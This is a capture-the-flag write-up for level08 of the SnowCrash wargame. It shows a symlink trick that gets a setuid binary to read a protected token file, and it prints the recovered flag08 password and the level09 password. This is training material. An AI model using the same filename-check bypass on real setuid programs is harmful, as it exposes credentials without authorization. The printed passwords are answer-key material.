## level08:

When I logged into level08, I found two files:

```

level08@SnowCrash:~$ ls -la
-rwsr-s---+ 1 flag08  level08 8617 Mar  5  2016 level08
-rw-------  1 flag08  flag08    26 Mar  5  2016 token
level08@SnowCrash:~$
```

The file **level08** is a binary file that takes a file as an argument. I tried giving it the `token` file, but the output was: ****

```bash
level08@SnowCrash:~$ ./level08 token
You may not access 'token'
level08@SnowCrash:~$
```

Now I am going to create a symbolic link from the file `/home/user/level08/token` to a new link located at `/tmp/flag` because I don't have access to the `token` file.

```bash
level08@SnowCrash:~$ ln -s /home/user/level08/token /tmp/flag
level08@SnowCrash:~$ ./level08  /tmp/flag
quif5eloekouj29ke0vouxean
level08@SnowCrash:~$
```

I retrieved the password for `flag08`. Let's log in to it to get the flag.

```bash
level08@SnowCrash:~$ su flag08
Password:quif5eloekouj29ke0vouxean
Don't forget to launch getflag !
flag08@SnowCrash:~$ getflag
Check flag.Here is your token : 25749xKZ8L7DkSCwJkT9dyv6f
flag08@SnowCrash:~$
```

the password of the next level is :25749xKZ8L7DkSCwJkT9dyv6f

```bash
flag08@SnowCrash:~$ su level09
Password:25749xKZ8L7DkSCwJkT9dyv6f
level09@SnowCrash:~$
```

##